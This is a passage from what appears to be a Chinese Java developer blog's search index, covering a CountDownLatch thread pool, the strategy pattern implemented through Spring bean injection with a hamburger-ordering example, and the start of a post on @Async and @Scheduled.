class="keyword">final</span> <span class="keyword">int</span> KEEP_ALIVE_TIME = <span class="number">60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CAPACITY = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * DemoThreadPoolConfig</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> guozhixian</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@date</span> 2022年5月15日 下午2:43:20</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span>(<span class="string">"DemoExecutorService"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ExecutorService <span class="title">executorService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> TtlExecutors.getTtlExecutorService(<span class="keyword">new</span> ThreadPoolExecutor(</span><br><span class="line">            Runtime.getRuntime().availableProcessors() * CORE_POOL_SIZE,</span><br><span class="line">            Runtime.getRuntime().availableProcessors() * MAXIMUM_POOL_SIZE, KEEP_ALIVE_TIME, TimeUnit.SECONDS,</span><br><span class="line">            <span class="keyword">new</span> ArrayBlockingQueue&lt;&gt;(CAPACITY), r -&gt; <span class="keyword">new</span> Thread(r, <span class="string">"Thread-countDownLatch"</span> + ATOMIC_INTEGER.getAndIncrement()),</span><br><span class="line">            <span class="keyword">new</span> MainRejectedExecutionHandler()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用线程池创建线程，并使用countDownLatch等待所有线程执行完毕</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Resource</span>(name = <span class="string">"DemoExecutorService"</span>)</span><br><span class="line"><span class="keyword">private</span> ExecutorService DemoExecutorService;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Transactional</span>(rollbackFor = Exception<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">void</span> <span class="title">batchAjqs</span>(<span class="title">List</span>&lt;<span class="title">String</span>&gt; <span class="title">ids</span>) </span>&#123;</span><br><span class="line">    CountDownLatch countDownLatch = <span class="keyword">new</span> CountDownLatch(ids.size());</span><br><span class="line">    <span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line">    ids.forEach(id -&gt; DemoExecutorService.execute(() -&gt; &#123;</span><br><span class="line">        ResponseEntity&lt;TestVO&gt; res = DataBaseApi.selectByPrimaryKey(id);</span><br><span class="line">        countDownLatch.countDown();</span><br><span class="line">    &#125;));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        countDownLatch.await();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        log.warn(<span class="string">"发生中断异常"</span>, e);</span><br><span class="line">        Thread.currentThread().interrupt();</span><br><span class="line">    &#125;</span><br><span class="line">    log.info(<span class="string">"批量处理&#123;&#125;个线程共花费&#123;&#125; ms"</span>, ids.size(), (System.currentTimeMillis() - start));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> countDownLatch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring容器注入实现策略模式</title>
      <link href="/2022/04/22/spring%E5%AE%B9%E5%99%A8%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F/"/>
      <url>/2022/04/22/spring%E5%AE%B9%E5%99%A8%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>一个项目对接多个系统的同一功能，或者同一功能多种实现的选择需求的策略模式实现。</p><h2 id="Spring容器实现"><a href="#Spring容器实现" class="headerlink" title="Spring容器实现"></a>Spring容器实现</h2><p>需求: 物质采购汉堡选择，可以选择采购肯德基或麦当劳</p><p>示例代码:</p><p>汉堡策略类上下文HamburgerContext:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HamburgerContext</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 汉堡采购service的实现类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, HamburgerStrategy&gt; HamburgerStrategyMap = <span class="keyword">new</span> ConcurrentHashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * HamburgerStrategyContext</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> guozhixian</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@date</span> 2022-4-14</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HamburgerStrategy <span class="title">getHamburgerStrategy</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> HamburgerStrategyMap.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汉堡策略类接口HamburgerStrategy：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * HamburgerStrategy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022-4-14</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HamburgerStrategy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">getBeefBurger</span><span class="params">(String count)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">getChickenBurger</span><span class="params">(String count)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汉堡策略接口实现类KFCStrategy：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span>(<span class="string">"KFCStrategy"</span>)</span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KFCStrategy</span> <span class="keyword">implements</span> <span class="title">HamburgerStrategy</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getBeefBurger</span><span class="params">(String count)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"采购KFC牛肉汉堡&#123;&#125;个"</span>,count);</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"KFC牛肉汉堡%s个"</span>, count);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getChickenBurger</span><span class="params">(String count)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"采购KFC鸡肉汉堡&#123;&#125;个"</span>,count);</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"KFC鸡肉汉堡%s个"</span>, count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汉堡策略接口实现类McDonaldStrategy：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span>(<span class="string">"McDonaldStrategy"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">McDonaldStrategy</span> <span class="keyword">implements</span> <span class="title">HamburgerStrategy</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getBeefBurger</span><span class="params">(String count)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"采购麦当劳牛肉汉堡&#123;&#125;个"</span>,count);</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"麦当劳牛肉汉堡%s个"</span>, count);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getChickenBurger</span><span class="params">(String count)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"采购麦当劳鸡肉汉堡&#123;&#125;个"</span>,count);</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"麦当劳鸡肉汉堡%s个"</span>, count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类枚举HamburgerEnum</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> HamburgerEnum &#123;</span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * KFC实现类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    KFC(<span class="string">"1"</span>, <span class="string">"KFCStrategy"</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * McDonald实现类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    MCDONALD(<span class="string">"2"</span>, <span class="string">"McDonaldStrategy"</span>);</span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 单值码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String code;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String value;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getStrategyByCode</span><span class="params">(String code)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 默认KFC实现类</span></span><br><span class="line">        String result = HamburgerEnum.KFC.value;</span><br><span class="line">        <span class="keyword">for</span> (HamburgerEnum hamburgerEnum : HamburgerEnum.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (StringUtils.equals(HamburgerEnum.code, code)) &#123;</span><br><span class="line">                result = HamburgerEnum.value;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>controller调用的策略选择service</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HamburgerChooseStrategy</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> HamburgerContext hamburgerContext;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;type&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String type;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据配置选择哪家牛肉汉堡</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> count 数量</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getBeefBurgerBySysConfig</span><span class="params">(String count)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hamburgerContext.getHamburgerStrategy(HamburgerEnum.getStrategyByCode(type)).getBeefBurger(count);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据参数选择哪家鸡肉汉堡</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">     <span class="function"><span class="keyword">public</span> String <span class="title">getChickenBurgerByParam</span><span class="params">(String count, String code)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hamburgerContext.getHamburgerService(HamburgerEnum.getStrategyByCode(code)).getChickenBurger(count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="传统策略模式写法实现"><a href="#传统策略模式写法实现" class="headerlink" title="传统策略模式写法实现"></a>传统策略模式写法实现</h2><p>汉堡策略类上下文HamburgerContext:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HamburgerContext</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> HamburgerStrategy hamburgerStrategy</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HamburgerContext</span><span class="params">(HamburgerStrategy hamburgerStrategy)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.hamburgerStrategy = hamburgerStrategy;</span><br><span class="line">    &#125;        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getBeefBurger</span><span class="params">(String count)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.hamburgerStrategy.getBeefBurger(count);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getChickenBurger</span><span class="params">(String count)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.hamburgerStrategy.getChickenBurger(count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汉堡策略类接口HamburgerStrategy：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * HamburgerStrategy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022-4-14</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HamburgerStrategy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">getBeefBurger</span><span class="params">(String count)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">getChickenBurger</span><span class="params">(String count)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汉堡策略接口实现类KFCStrategy：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KFCStrategy</span> <span class="keyword">implements</span> <span class="title">HamburgerStrategy</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getBeefBurger</span><span class="params">(String count)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"采购KFC牛肉汉堡&#123;&#125;个"</span>,count);</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"KFC牛肉汉堡%s个"</span>, count);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getChickenBurger</span><span class="params">(String count)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"采购KFC鸡肉汉堡&#123;&#125;个"</span>,count);</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"KFC鸡肉汉堡%s个"</span>, count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汉堡策略接口实现类McDonaldStrategy：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">McDonaldStrategy</span> <span class="keyword">implements</span> <span class="title">HamburgerStrategy</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getBeefBurger</span><span class="params">(String count)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"采购麦当劳牛肉汉堡&#123;&#125;个"</span>,count);</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"麦当劳牛肉汉堡%s个"</span>, count);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getChickenBurger</span><span class="params">(String count)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"采购麦当劳鸡肉汉堡&#123;&#125;个"</span>,count);</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"麦当劳鸡肉汉堡%s个"</span>, count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类枚举HamburgerEnum</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> HamburgerEnum &#123;</span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * KFC实现类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    KFC(<span class="string">"1"</span>, <span class="string">"KFC"</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * McDonald实现类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    MCDONALD(<span class="string">"2"</span>, <span class="string">"MCDONALD"</span>);</span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 单值码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String code;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>controller调用的策略选择service</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HamburgerChooseStrategy</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;type&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String type;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> KFCStrategy kfcStrategy;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> McDonaldStrategy mcDonaldStrategy;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        HamburgerStrategy hamburgerStrategy;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isNotBlank(type) &amp;&amp; HamburgerEnum.KFC.getName().equals(type)) &#123;</span><br><span class="line">            hamburgerStrategy = kfcStrategy;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            hamburgerStrategy = mcDonaldStrategy;</span><br><span class="line">        &#125;</span><br><span class="line">        HamburgerContext = <span class="keyword">new</span> HamburgerContext(hamburgerStrategy);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据配置选择哪家牛肉汉堡</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> count 数量</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getBeefBurgerBySysConfig</span><span class="params">(String count)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hamburgerContext.getBeefBurger(count);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据参数选择哪家鸡肉汉堡</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">     <span class="function"><span class="keyword">public</span> String <span class="title">getChickenBurgerByParam</span><span class="params">(String count, String code)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hamburgerContext.geChickenBurger(count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> spring </tag>
            
            <tag> Strategy </tag>
            
            <tag> 策略模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Async与Scheduled注解</title>
      <link href="/2022/04/02/Async%E4%B8%8EScheduled/"/>
      <url>/2022/04/02/Async%E4%B8%8EScheduled/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近项目中使用了@Async与@Scheduled自定义线程池注解实现定时任务，特此记录实现及其原理。</p><h2 id="Async"><a href="#Async" class="headerlink" title="@Async"></a>@Async</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>@Async是Spring 3.0之后提供的注解，使用@Async注解可以轻松的实现异步调用。</p><p>官方文档: <a href="https://docs.spring.io/spring/docs/current/javadoc-api/org/springframework/scheduling/annotation/Async.html" target="_blank" rel="noopener">https://docs.spring.io/spring/docs/current/javadoc-api/org/springframework/scheduling/annotation/Async.html</a></p><h3 id="异步原理"><a href="#异步原理" class="headerlink" title="异步原理"></a>异步原理</h3><p>@Async在默认情况下使用的是SimpleAsyncTaskExecutor线程池，该线程池不是真正意义上的线程池。<strong>使用此线程池无法实现线程重用，每次调用都会新建一条线程。若系统中不断的创建线程，最终会导致系统占用内存过高，引发<code>OutOfMemoryError</code>错误</strong></p><h3 id="关系图"><a href="#关系图" class="headerlink" title="关系图"></a>关系图</h3><p><img src="/img/Async/Async0.png" alt=""></p><p><img src="/img/Async/Async1.png" alt=""></p><h3 id="Async配置默认线程池"><a href="#Async配置默认线程池" class="headerlink" title="@Async配置默认线程池"></a>@Async配置默认线程池</h3><ul><li>要配置默认的线程池，要实现<code>AsyncConfigurer</code>类的两个方法</li></ul><ul><li>不需要打印运行状况的可以使用ThreadPoolTaskExecutor类构建线程池</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 